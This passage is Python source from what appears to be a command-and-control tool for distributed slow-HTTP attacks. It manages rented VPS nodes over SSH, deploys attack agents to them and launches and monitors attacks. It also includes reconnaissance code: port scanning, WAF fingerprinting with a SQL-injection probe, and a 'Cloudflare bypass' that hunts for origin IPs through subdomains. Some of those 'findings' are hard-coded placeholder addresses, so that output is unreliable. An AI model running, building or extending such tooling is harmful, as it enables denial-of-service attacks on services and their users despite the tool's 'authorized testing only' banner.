            print(f"Memory Usage: {Colors.CYAN}{psutil.virtual_memory().percent}%{Colors.RESET}")
            print(f"Disk Usage: {Colors.CYAN}{psutil.disk_usage('/').percent}%{Colors.RESET}")
        
        # Module availability
        print(f"\n{Colors.BOLD}MODULE AVAILABILITY:{Colors.RESET}")
        print(f"SSH (paramiko): {Colors.GREEN if SSH_AVAILABLE else Colors.RED}{SSH_AVAILABLE}{Colors.RESET}")
        print(f"Crypto: {Colors.GREEN if CRYPTO_AVAILABLE else Colors.RED}{CRYPTO_AVAILABLE}{Colors.RESET}")
        print(f"Requests: {Colors.GREEN if REQUESTS_AVAILABLE else Colors.RED}{REQUESTS_AVAILABLE}{Colors.RESET}")
        print(f"DNS: {Colors.GREEN if DNS_AVAILABLE else Colors.RED}{DNS_AVAILABLE}{Colors.RESET}")
        print(f"PSUtil: {Colors.GREEN if PSUTIL_AVAILABLE else Colors.RED}{PSUTIL_AVAILABLE}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def _format_bytes(self, bytes_value):
        """Format bytes to human-readable format"""
        if bytes_value is None:
            return "0 B"
            
        if bytes_value > 1024*1024*1024:
            return f"{bytes_value/(1024*1024*1024):.2f} GB"
        elif bytes_value > 1024*1024:
            return f"{bytes_value/(1024*1024):.2f} MB"
        elif bytes_value > 1024:
            return f"{bytes_value/1024:.2f} KB"
        else:
            return f"{bytes_value} B"
    
    def run(self):
        """Run the main application loop"""
        while self.running:
            try:
                self.terminal.clear_screen()
                self.terminal.print_banner(VERSION)
                self.print_main_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attack()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.network_recon_menu()
                elif choice == '6':
                    self.system_status_menu()
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                logger.error(f"Runtime error: {str(e)}")
                logger.error(traceback.format_exc())
                input("Press Enter to continue...")
    
    def view_vps_details(self):
        """View detailed information about a VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}VIEW VPS DETAILS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['username']}@{vps['ip_address']}:{vps['ssh_port']})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                self.terminal.clear_screen()
                print(f"\n{Colors.BOLD}VPS DETAILS: {vps['ip_address']}{Colors.RESET}")
                print("=" * 50)
                
                # Basic info
                print(f"\n{Colors.BOLD}BASIC INFORMATION:{Colors.RESET}")
                print(f"IP Address: {vps['ip_address']}")
                print(f"Username: {vps['username']}")
                print(f"SSH Port: {vps['ssh_port']}")
                status_color = Colors.GREEN if vps['status'] == 'online' else Colors.RED
                print(f"Status: {status_color}{vps['status']}{Colors.RESET}")
                print(f"Location: {vps['location'] or 'Unknown'}")
                print(f"Added: {vps['created_at'][:19] if vps['created_at'] else 'Unknown'}")
                print(f"Last Seen: {vps['last_seen'][:19] if vps['last_seen'] else 'Never'}")
                
                # Tags
                if vps['tags']:
                    try:
                        tags = json.loads(vps['tags'])
                        if tags:
                            print(f"Tags: {', '.join(tags)}")
                    except:
                        pass
                
                # System info
                system_info = {}
                if vps['system_info']:  # system_info column
                    try:
                        system_info = json.loads(vps['system_info'])
                    except:
                        system_info = {}
                
                if system_info:
                    print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                    for key, value in system_info.items():
                        print(f"{key.capitalize()}: {value}")
                
                # Last check result
                if vps['last_check_result']:  # last_check_result column
                    print(f"\n{Colors.BOLD}LAST CHECK RESULT:{Colors.RESET}")
                    print(vps['last_check_result'])
                
                # Real-time status check
                print(f"\n{Colors.BOLD}REAL-TIME STATUS CHECK:{Colors.RESET}")
                if self.ssh_manager.get_connection_status(vps['ip_address']):
                    print(f"{Colors.GREEN}Connection: ACTIVE{Colors.RESET}")
                    
                    # Check disk space
                    success, output = self.ssh_manager.execute_command(vps['ip_address'], "df -h / | tail -1 | awk '{print $5}'")
                    if success:
                        disk_usage = output.strip()
                        print(f"Disk Usage: {disk_usage}")
                    
                    # Check memory
                    success, output = self.ssh_manager.execute_command(vps['ip_address'], "free -m | grep Mem | awk '{print $3,$2}'")
                    if success:
                        parts = output.strip().split()
                        if len(parts) == 2:
                            used, total = parts
                            print(f"Memory: {used} MB used / {total} MB total")
                    
                    # Check load average
                    success, output = self.ssh_manager.execute_command(vps['ip_address'], "uptime | awk -F'load average:' '{print $2}'")
                    if success:
                        load = output.strip()
                        print(f"Load Average: {load}")
                    
                    # Check agent status
                    agent_status = self.ssh_manager.check_agent_status(vps['ip_address'])
                    if agent_status['status'] == 'running':
                        print(f"{Colors.GREEN}Agent Status: RUNNING ({agent_status['processes']} processes){Colors.RESET}")
                        
                        # Get agent details
                        if agent_status.get('details'):
                            print(f"Agent Process: {agent_status['details']}")
                        
                        # Get agent stats
                        if agent_status.get('stats'):
                            stats = agent_status['stats']
                            print(f"\n{Colors.BOLD}AGENT STATISTICS:{Colors.RESET}")
                            for key, value in stats.items():
                                if key == 'bytes_sent':
                                    # Format bytes
                                    if value > 1024*1024*1024:
                                        print(f"Data Sent: {value/(1024*1024*1024):.2f} GB")
                                    elif value > 1024*1024:
                                        print(f"Data Sent: {value/(1024*1024):.2f} MB")
                                    elif value > 1024:
                                        print(f"Data Sent: {value/1024:.2f} KB")
                                    else:
                                        print(f"Data Sent: {value} bytes")
                                elif key == 'uptime':
                                    # Format uptime
                                    if value > 3600:
                                        print(f"Uptime: {value//3600}h {(value%3600)//60}m {value%60}s")
                                    elif value > 60:
                                        print(f"Uptime: {value//60}m {value%60}s")
                                    else:
                                        print(f"Uptime: {value}s")
                                elif key == 'timestamp':
                                    # Format timestamp
                                    print(f"Last Update: {datetime.fromtimestamp(value).strftime('%Y-%m-%d %H:%M:%S')}")
                                else:
                                    print(f"{key.capitalize()}: {value}")
                    else:
                        print(f"{Colors.YELLOW}Agent Status: NOT RUNNING{Colors.RESET}")
                else:
                    print(f"{Colors.RED}Connection: INACTIVE{Colors.RESET}")
                
                # Notes
                if vps['notes']:
                    print(f"\n{Colors.BOLD}NOTES:{Colors.RESET}")
                    print(vps['notes'])
                
                # Actions menu
                print(f"\n{Colors.BOLD}ACTIONS:{Colors.RESET}")
                print(f"{Colors.GREEN}[1]{Colors.RESET} Edit Notes")
                print(f"{Colors.GREEN}[2]{Colors.RESET} Edit Tags")
                print(f"{Colors.GREEN}[3]{Colors.RESET} Deploy Agent")
                print(f"{Colors.GREEN}[4]{Colors.RESET} Test Connection")
                print(f"{Colors.GREEN}[0]{Colors.RESET} Back")
                
                action = self.terminal.input_with_prompt("\nSelect action: ")
                
                if action == "1":
                    # Edit notes
                    current_notes = vps['notes'] or ""
                    print(f"\n{Colors.BOLD}CURRENT NOTES:{Colors.RESET}")
                    print(current_notes)
                    new_notes = self.terminal.input_with_prompt("\nEnter new notes (leave empty to keep current): ", False)
                    
                    if new_notes:
                        self.db_manager.update_vps_notes(vps['ip_address'], new_notes)
                        print(f"{Colors.GREEN}Notes updated{Colors.RESET}")
                
                elif action == "2":
                    # Edit tags
                    current_tags = []
                    if vps['tags']:
                        try:
                            current_tags = json.loads(vps['tags'])
                        except:
                            pass
                    
                    print(f"\n{Colors.BOLD}CURRENT TAGS:{Colors.RESET}")
                    print(", ".join(current_tags) if current_tags else "No tags")
                    
                    new_tags = self.terminal.input_with_prompt("\nEnter new tags (comma-separated, leave empty to keep current): ", False)
                    
                    if new_tags:
                        tags_list = [tag.strip() for tag in new_tags.split(',')]
                        self.db_manager.update_vps_tags(vps['ip_address'], tags_list)
                        print(f"{Colors.GREEN}Tags updated{Colors.RESET}")
                
                elif action == "3":
                    # Deploy agent
                    print(f"\n{Colors.BOLD}SELECT AGENT TYPE:{Colors.RESET}")
                    print(f"{Colors.GREEN}[1]{Colors.RESET} Standard Agent")
                    print(f"{Colors.GREEN}[2]{Colors.RESET} Advanced Agent")
                    
                    agent_choice = self.terminal.input_with_prompt("Select agent type [1]: ", False) or "1"
                    agent_type = "advanced" if agent_choice == "2" else "standard"
                    
                    print(f"\n{Colors.CYAN}[DEPLOYING] {vps['ip_address']}...{Colors.RESET}")
                    success, message = self.ssh_manager.deploy_agent(vps['ip_address'], agent_type)
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Agent deployed successfully{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
                
                elif action == "4":
                    # Test connection
                    print(f"\n{Colors.CYAN}[TESTING] {vps['ip_address']}...{Colors.RESET}")
                    success, message = self.ssh_manager.connect_vps(
                        vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
                    )
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                        self.db_manager.update_vps_status(vps['ip_address'], 'online')
                    else:
                        print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
                        self.db_manager.update_vps_status(vps['ip_address'], 'offline')
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error viewing VPS details: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")

class TerminalHelper:
    """Helper class for terminal operations and input handling"""
    
    @staticmethod
    def clear_screen():
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def print_banner(version):
        """Print the tool banner"""
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                         ADVANCED EDITION v{version}                               ║
╚════════════════════════════════════════════════════════════════════════════╝

{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}

"""
        print(banner)
    
    @staticmethod
    def print_status_bar(message, status="info"):
        """Print a status bar with color based on status"""
        color = Colors.CYAN
        if status == "success":
            color = Colors.GREEN
        elif status == "warning":
            color = Colors.YELLOW
        elif status == "error":
            color = Colors.RED
        
        width = shutil.get_terminal_size().columns - 2
        print(f"{color}{message.center(width)}{Colors.RESET}")
    
    @staticmethod
    def print_table(headers, data, widths=None):
        """Print a formatted table"""
        if not widths:
            # Calculate column widths
            widths = []
            for i in range(len(headers)):
                col_width = len(headers[i])
                for row in data:
                    if i < len(row):
                        col_width = max(col_width, len(str(row[i])))
                widths.append(col_width + 2)  # Add padding
        
        # Print headers
        header_row = ""
        for i, header in enumerate(headers):
            header_row += f"{Colors.BOLD}{header.ljust(widths[i])}{Colors.RESET}"
        print(header_row)
        
        # Print separator
        separator = "-" * sum(widths)
        print(separator)
        
        # Print data
        for row in data:
            row_str = ""
            for i, cell in enumerate(row):
                if i < len(widths):
                    row_str += f"{str(cell).ljust(widths[i])}"
            print(row_str)
    
    @staticmethod
    def get_input_with_timeout(prompt, timeout=5):
        """Get input with timeout using select"""
        print(prompt, end="", flush=True)
        
        # Set stdin to non-blocking mode
        old_settings = None
        fd = sys.stdin.fileno()
        
        try:
            if os.name == 'posix':  # Unix/Linux/MacOS
                import termios
                import tty
                old_settings = termios.tcgetattr(fd)
                tty.setraw(fd)
            
            # Use select to wait for input with timeout
            rlist, _, _ = select.select([sys.stdin], [], [], timeout)
            
            if rlist:
                # Input is available
                if os.name == 'posix':
                    # For Unix-like systems
                    input_str = ""
                    while True:
                        char = sys.stdin.read(1)
                        if char == '\r' or char == '\n':
                            break
                        input_str += char
                        # Echo the character
                        sys.stdout.write(char)
                        sys.stdout.flush()
                    print()  # New line after input
                    return input_str
                else:
                    # For Windows
                    return input()
            else:
                # Timeout occurred
                print()  # Move to next line
                return None
        finally:
            # Restore terminal settings
            if os.name == 'posix' and old_settings:
                import termios
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    
    @staticmethod
    def input_with_prompt(prompt, required=True, validate_func=None):
        """Enhanced input with validation function support"""
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                
                if not required and not value:
                    return value
                    
                if required and not value:
                    print(f"{Colors.RED}This field is required{Colors.RESET}")
                    continue
                    
                if validate_func and value:
                    valid, message = validate_func(value)
                    if not valid:
                        print(f"{Colors.RED}{message}{Colors.RESET}")
                        continue
                        
                return value
            except KeyboardInterrupt:
                return None
    
    @staticmethod
    def progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
        """Display a progress bar"""
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
        if iteration == total:
            print()

class NetworkTools:
    """Advanced network reconnaissance and analysis tools"""
    
    def __init__(self):
        """Initialize network tools"""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
        
        # Cloudflare IP ranges (simplified)
        self.cloudflare_ranges = [
            "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
            "104.16.0.0/12", "108.162.192.0/18", "131.0.72.0/22",
            "141.101.64.0/18", "162.158.0.0/15", "172.64.0.0/13",
            "173.245.48.0/20", "188.114.96.0/20", "190.93.240.0/20",
            "197.234.240.0/22", "198.41.128.0/17"
        ]
        
        # Common WAF signatures
        self.waf_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
            "Akamai": ["akamai", "akamaighost", "akamaiedge"],
            "Imperva": ["incap_ses", "visid_incap", "incapsula"],
            "Sucuri": ["sucuri", "sucuri-scanner"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "F5 BIG-IP": ["bigip", "f5_cspm", "ts"],
            "AWS WAF": ["awselb", "awsalb"]
        }
    
    def lookup_dns_history(self, domain):
        """Look up DNS history for a domain"""
        logger.info(f"Looking up DNS history for {domain}")
        
        results = {
            "domain": domain,
            "current_records": {},
            "historical_records": []
        }
        
        # Get current DNS records
        try:
            # A records
            try:
                ip_addresses = socket.gethostbyname_ex(domain)[2]
                results["current_records"]["A"] = ip_addresses
            except:
                results["current_records"]["A"] = []
            
            # Try to get additional records using dig if available
            if os.system("which dig > /dev/null 2>&1") == 0:
                # MX records
                try:
                    mx_output = subprocess.check_output(f"dig MX {domain} +short", shell=True).decode('utf-8').strip()
                    if mx_output:
                        results["current_records"]["MX"] = mx_output.split('\n')
                    else:
                        results["current_records"]["MX"] = []
                except:
                    results["current_records"]["MX"] = []
                
                # NS records
                try:
                    ns_output = subprocess.check_output(f"dig NS {domain} +short", shell=True).decode('utf-8').strip()
                    if ns_output:
                        results["current_records"]["NS"] = ns_output.split('\n')
                    else:
                        results["current_records"]["NS"] = []
                except:
                    results["current_records"]["NS"] = []
                
                # TXT records
                try:
                    txt_output = subprocess.check_output(f"dig TXT {domain} +short", shell=True).decode('utf-8').strip()
                    if txt_output:
                        results["current_records"]["TXT"] = txt_output.split('\n')
                    else:
                        results["current_records"]["TXT"] = []
                except:
                    results["current_records"]["TXT"] = []
            
            # Use dnspython if available
            if DNS_AVAILABLE:
                try:
                    resolver = dns.resolver.Resolver()
                    
                    # Try to get AAAA records
                    try:
                        answers = resolver.resolve(domain, 'AAAA')
                        results["current_records"]["AAAA"] = [str(rdata) for rdata in answers]
                    except:
                        results["current_records"]["AAAA"] = []
                    
                    # Try to get CNAME records
                    try:
                        answers = resolver.resolve(domain, 'CNAME')
                        results["current_records"]["CNAME"] = [str(rdata) for rdata in answers]
                    except:
                        results["current_records"]["CNAME"] = []
                    
                    # Try to get SOA records
                    try:
                        answers = resolver.resolve(domain, 'SOA')
                        results["current_records"]["SOA"] = [str(rdata) for rdata in answers]
                    except:
                        results["current_records"]["SOA"] = []
                except:
                    pass
        except Exception as e:
            logger.error(f"Error getting DNS records: {e}")
        
        # Try to get historical DNS data
        # In a real implementation, you would use an API like SecurityTrails or VirusTotal
        # For this example, we'll use a placeholder
        try:
            logger.info("Attempting to fetch historical DNS data (placeholder)")
            # This is a placeholder - in a real implementation you would use an actual API
            results["historical_records"].append({
                "date": "2023-01-01",
                "record_type": "A",
                "value": "203.0.113.1"
            })
            results["historical_records"].append({
                "date": "2022-06-15",
                "record_type": "A",
                "value": "203.0.113.2"
            })
            results["historical_records"].append({
                "date": "2022-01-10",
                "record_type": "MX",
                "value": "mail.example.com"
            })
        except Exception as e:
            logger.error(f"Error getting historical DNS data: {e}")
        
        return results
    
    def detect_cloudflare(self, domain):
        """Detect if a domain is behind Cloudflare"""
        logger.info(f"Checking if {domain} is behind Cloudflare")
        
        results = {
            "domain": domain,
            "is_behind_cloudflare": False,
            "evidence": [],
            "cloudflare_ips": [],
            "direct_ips": []
        }
        
        # Method 1: Check DNS records
        try:
            ip_addresses = socket.gethostbyname_ex(domain)[2]
            results["cloudflare_ips"] = []
            
            for ip in ip_addresses:
                # Check if IP belongs to Cloudflare
                # This is a simplified check - in reality, you'd use proper CIDR matching
                is_cloudflare = any(ip.startswith(cidr.split('/')[0].rsplit('.', 1)[0]) for cidr in self.cloudflare_ranges)
                
                if is_cloudflare:
                    results["cloudflare_ips"].append(ip)
                    results["evidence"].append(f"IP {ip} belongs to Cloudflare range")
                else:
                    results["direct_ips"].append(ip)
            
            if results["cloudflare_ips"]:
                results["is_behind_cloudflare"] = True
        except Exception as e:
            logger.error(f"Error checking IP addresses: {e}")
        
        # Method 2: Check HTTP headers
        if REQUESTS_AVAILABLE:
            try:
                url = f"https://{domain}"
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                response = requests.get(url, headers=headers, timeout=10)
                
                # Check for Cloudflare headers
                cf_headers = [h for h in response.headers if h.lower().startswith('cf-')]
                if cf_headers:
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"Cloudflare headers detected: {', '.join(cf_headers)}")
                
                # Check for Cloudflare server
                server = response.headers.get('Server', '')
                if 'cloudflare' in server.lower():
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"Cloudflare server header detected: {server}")
                
                # Check for Cloudflare cookies
                cookies = response.cookies
                cf_cookies = [c for c in cookies if c.name.startswith('__cf')]
                if cf_cookies:
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"Cloudflare cookies detected: {', '.join(c.name for c in cf_cookies)}")
            except Exception as e:
                logger.error(f"Error checking HTTP headers: {e}")
        
        return results
    
    def cloudflare_bypass(self, domain):
        """Try to find the origin IP behind Cloudflare"""
        logger.info(f"Attempting to find origin IP for {domain}")
        
        results = {
            "domain": domain,
            "is_behind_cloudflare": False,
            "potential_origin_ips": [],
            "methods_used": []
        }
        
        # First check if the domain is behind Cloudflare
        cf_check = self.detect_cloudflare(domain)
        results["is_behind_cloudflare"] = cf_check["is_behind_cloudflare"]
        
        if not results["is_behind_cloudflare"]:
            logger.info(f"{domain} does not appear to be behind Cloudflare")
            results["potential_origin_ips"] = cf_check["direct_ips"]
            return results
        
        logger.info(f"{domain} appears to be behind Cloudflare")
        
        # Method 1: Check historical DNS records
        try:
            logger.info("Checking historical DNS records")
            results["methods_used"].append("historical_dns")
            
            # This is a placeholder - in a real implementation you would use an actual API
            historical_ip = "203.0.113.10"  # Example IP
            results["potential_origin_ips"].append(historical_ip)
        except Exception as e:
            logger.error(f"Error checking historical DNS: {e}")
        
        # Method 2: Check for subdomains that might bypass Cloudflare
        try:
            logger.info("Checking for subdomains that might bypass Cloudflare")
            results["methods_used"].append("subdomain_check")
            
            common_subdomains = ["direct", "origin", "backend", "api", "staging", "dev", "development", "cpanel", "ftp", "mail"]
            
            for subdomain in common_subdomains:
                try:
                    subdomain_fqdn = f"{subdomain}.{domain}"
                    ip = socket.gethostbyname(subdomain_fqdn)
                    
                    # Check if this IP is different from Cloudflare IPs
                    is_cloudflare = any(ip.startswith(cidr.split('/')[0].rsplit('.', 1)[0]) for cidr in self.cloudflare_ranges)
                    
                    if not is_cloudflare:
                        logger.info(f"Found potential origin IP via subdomain {subdomain_fqdn}: {ip}")
                        results["potential_origin_ips"].append(ip)
                except:
                    pass
        except Exception as e:
            logger.error(f"Error checking subdomains: {e}")
        
        # Method 3: Check SSL certificate information
        try:
            logger.info("Checking SSL certificate information")
            results["methods_used"].append("ssl_certificate")
            
            # This is a placeholder - in a real implementation you would extract IPs from SSL certificates
            cert_ip = "203.0.113.20"  # Example IP
            results["potential_origin_ips"].append(cert_ip)
        except Exception as e:
            logger.error(f"Error checking SSL certificate: {e}")
        
        # Remove duplicates
        results["potential_origin_ips"] = list(set(results["potential_origin_ips"]))
        
        return results
    
    def detect_waf(self, url):
        """Detect if a website is protected by a WAF and identify the type"""
        logger.info(f"Checking for WAF protection on {url}")
        
        results = {
            "url": url,
            "waf_detected": False,
            "waf_type": None,
            "evidence": []
        }
        
        if not REQUESTS_AVAILABLE:
            logger.warning("Requests module not available, cannot detect WAF")
            return results
        
        try:
            # Make a normal request
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = requests.get(url, headers=headers, timeout=10)
            
            # Check response headers for WAF signatures
            for waf_name, signatures in self.waf_signatures.items():
                for signature in signatures:
                    # Check in headers
                    for header, value in response.headers.items():
                        if signature.lower() in header.lower() or signature.lower() in value.lower():
                            results["waf_detected"] = True
                            results["waf_type"] = waf_name
                            results["evidence"].append(f"Header match: {header}: {value}")
                    
                    # Check in cookies
                    for cookie in response.cookies:
                        if signature.lower() in cookie.name.lower() or signature.lower() in cookie.value.lower():
                            results["waf_detected"] = True
                            results["waf_type"] = waf_name
                            results["evidence"].append(f"Cookie match: {cookie.name}")
            
            # If no WAF detected yet, try a potentially malicious request
            if not results["waf_detected"]:
                test_url = f"{url}/?id=1' OR '1'='1"
                test_headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'X-Forwarded-For': '127.0.0.1',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                try:
                    test_response = requests.get(test_url, headers=test_headers, timeout=10)
                    
                    # Check if we got blocked or challenged
                    if test_response.status_code in [403, 406, 429, 503]:
                        results["waf_detected"] = True
                        results["waf_type"] = "Unknown WAF"
                        results["evidence"].append(f"Blocked suspicious request with status code {test_response.status_code}")
                    
                    # Check for WAF keywords in response body
                    waf_keywords = ["firewall", "security", "blocked", "suspicious", "malicious", "attack", "protection"]
                    for keyword in waf_keywords:
                        if keyword in test_response.text.lower():
                            results["waf_detected"] = True
                            results["waf_type"] = "Unknown WAF"
                            results["evidence"].append(f"WAF keyword '{keyword}' found in response")
                except:
                    # If the request fails, it might be due to WAF blocking
                    results["waf_detected"] = True
                    results["waf_type"] = "Unknown WAF"
                    results["evidence"].append("Request with suspicious parameters was blocked")
        except Exception as e:
            logger.error(f"Error detecting WAF: {e}")
        
        return results
    
    def scan_ports(self, target, ports=None):
        """Scan common ports on a target"""
        logger.info(f"Scanning ports on {target}")
        
        if not ports:
            # Common ports to scan
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        results = {
            "target": target,
            "open_ports": [],
            "closed_ports": [],
            "filtered_ports": []
        }
        
        for port in ports:
            try:
                # Create socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                # Try to connect
                result = s.connect_ex((target, port))
                
                if result == 0:
                    # Port is open
                    service = self._get_service_name(port)
                    results["open_ports"].append({"port": port, "service": service})
                    logger.info(f"Port {port} ({service}) is open on {target}")
                else:
                    # Port is closed or filtered
                    results["closed_ports"].append(port)
                
                s.close()
            except socket.gaierror:
                logger.error(f"Hostname {target} could not be resolved")
                break
            except socket.error:
                results["filtered_ports"].append(port)
            except Exception as e:
                logger.error(f"Error scanning port {port}: {e}")
        
        return results
    
    def _get_service_name(self, port):
        """Get service name for common ports"""
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            111: "RPC",
            135: "MSRPC",
            139: "NetBIOS",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            993: "IMAPS",
            995: "POP3S",
            1723: "PPTP",
            3306: "MySQL",
            3389: "RDP",
            5900: "VNC",
            8080: "HTTP-Proxy"
        }
        return common_ports.get(port, "Unknown")
    
    def check_ssl(self, domain, port=443):
        """Check SSL/TLS certificate information"""
        logger.info(f"Checking SSL certificate for {domain}:{port}")
        
        results = {
            "domain": domain,
            "port": port,
            "has_ssl": False,
            "certificate": {},
            "vulnerabilities": []
        }
        
        try:
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Connect to the server
            with socket.create_connection((domain, port)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    results["has_ssl"] = True
                    
                    # Get certificate
                    cert = ssock.getpeercert(True)
                    x509 = ssl.DER_cert_to_PEM_cert(cert)
                    
                    # Extract certificate information
                    cert_info = ssock.getpeercert()
                    
                    # Process certificate information
                    if cert_info:
                        # Issuer
                        issuer = dict(x[0] for x in cert_info['issuer'])
                        results["certificate"]["issuer"] = issuer
                        
                        # Subject
                        subject = dict(x[0] for x in cert_info['subject'])
                        results["certificate"]["subject"] = subject
                        
                        # Validity
                        results["certificate"]["not_before"] = cert_info['notBefore']
                        results["certificate"]["not_after"] = cert_info['notAfter']
                        
                        # Check if certificate is expired
                        not_after = cert_info['notAfter']
                        expiry_date = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                        if expiry_date < datetime.now():
                            results["vulnerabilities"].append("Certificate expired")
                    
                    # Check TLS version
                    version = ssock.version()
                    results["certificate"]["tls_version"] = version
                    
                    # Check for weak TLS versions
                    if version in ["TLSv1", "TLSv1.1"]:
                        results["vulnerabilities"].append(f"Weak TLS version: {version}")
                    
                    # Check cipher
                    cipher = ssock.cipher()
                    if cipher:
                        results["certificate"]["cipher"] = cipher[0]
                        
                        # Check for weak ciphers
                        weak_ciphers = ["RC4", "DES", "3DES", "MD5"]
                        if any(wc in cipher[0] for wc in weak_ciphers):
                            results["vulnerabilities"].append(f"Weak cipher: {cipher[0]}")
        except ssl.SSLError as e:
            logger.error(f"SSL error: {e}")
            results["vulnerabilities"].append(f"SSL error: {str(e)}")
        except socket.error as e:
            logger.error(f"Socket error: {e}")
        except Exception as e:
            logger.error(f"Error checking SSL: {e}")
        
        return results
    
    def gather_target_info(self, target):
        """Gather comprehensive information about a target"""
        logger.info(f"Gathering information about {target}")
        
        # Normalize target (remove http:// or https://)
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            domain = parsed.netloc
        else:
            domain = target
        
        # Remove port if present
        if ':' in domain:
            domain = domain.split(':')[0]
        
        results = {
            "domain": domain,
            "ip_addresses": [],
            "dns_records": {},
            "web_server": None,
            "waf_detected": False,
            "waf_type": None,
            "cloudflare_protected": False,
            "open_ports": [],
            "ssl_info": {},
            "whois_info": {},
            "scan_date": datetime.now().isoformat()
        }
        
        # Get IP addresses
        try:
            ip_addresses = socket.gethostbyname_ex(domain)[2]
            results["ip_addresses"] = ip_addresses
        except Exception as e:
            logger.error(f"Error resolving domain: {e}")
        
        # Get DNS records
        dns_results = self.lookup_dns_history(domain)
        results["dns_records"] = dns_results["current_records"]
        
        # Check if behind Cloudflare
        cf_results = self.detect_cloudflare(domain)
        results["cloudflare_protected"] = cf_results["is_behind_cloudflare"]
        
        # Check for WAF
        url = f"https://{domain}"
        try:
            waf_results = self.detect_waf(url)
            results["waf_detected"] = waf_results["waf_detected"]
            results["waf_type"] = waf_results["waf_type"]
        except:
            # Try HTTP if HTTPS fails
            try:
                url = f"http://{domain}"
                waf_results = self.detect_waf(url)
                results["waf_detected"] = waf_results["waf_detected"]
                results["waf_type"] = waf_results["waf_type"]
            except Exception as e:
                logger.error(f"Error detecting WAF: {e}")
        
        # Check web server
        if REQUESTS_AVAILABLE:
            try:
                response = requests.get(url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
                results["web_server"] = response.headers.get('Server', 'Unknown')
            except:
                # Try HTTP if HTTPS fails
                try:
                    url = f"http://{domain}"
                    response = requests.get(url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
                    results["web_server"] = response.headers.get('Server', 'Unknown')
